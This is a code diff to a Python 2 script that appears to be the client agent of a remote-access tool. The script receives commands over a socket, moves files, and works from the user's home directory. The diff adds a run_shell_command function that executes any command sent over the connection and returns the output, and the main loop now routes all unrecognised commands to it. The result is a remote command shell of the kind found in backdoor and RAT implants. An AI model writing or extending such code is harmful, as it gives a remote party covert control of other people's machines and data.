@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import json, os, base64, sys, socket, ssl, getpass
+import json, os, base64, sys, socket, ssl, getpass, subprocess
 from os.path import expanduser
 home = expanduser("~")
 os.chdir(home)
@@ -95,7 +95,6 @@ def send_file(cmd_data):
 def receive_file(cmd_data):
 	term = cmd_data['term']
 	extra_args = json.loads(cmd_data['args'])
-	print extra_args
 	size = int(extra_args['size'])
 	file_path = extra_args['path']
 	file_name = extra_args['filename']
@@ -105,6 +104,18 @@ def receive_file(cmd_data):
 		if str(chunk) == str(term):
 			break
 		f.write(chunk)
+
+
+def run_shell_command(cmd_data):
+	try:
+		full_input = cmd_data['cmd'] + " " + cmd_data['args'].rstrip()
+		print full_input.split()
+		result = subprocess.check_output(full_input.split())
+		if result:
+			sock.send(result)
+	except Exception as e:
+		sock.send(str(e))
+	sock.send(cmd_data['term'])
 
 
 # SETUP
@@ -127,6 +138,5 @@ while 1:
 	elif cmd == "pwd":
 		pwd(cmd_data)
 	else:
-		sock.send('exec')
-		sock.send(cmd_data['term'])
+		run_shell_command(cmd_data)
 
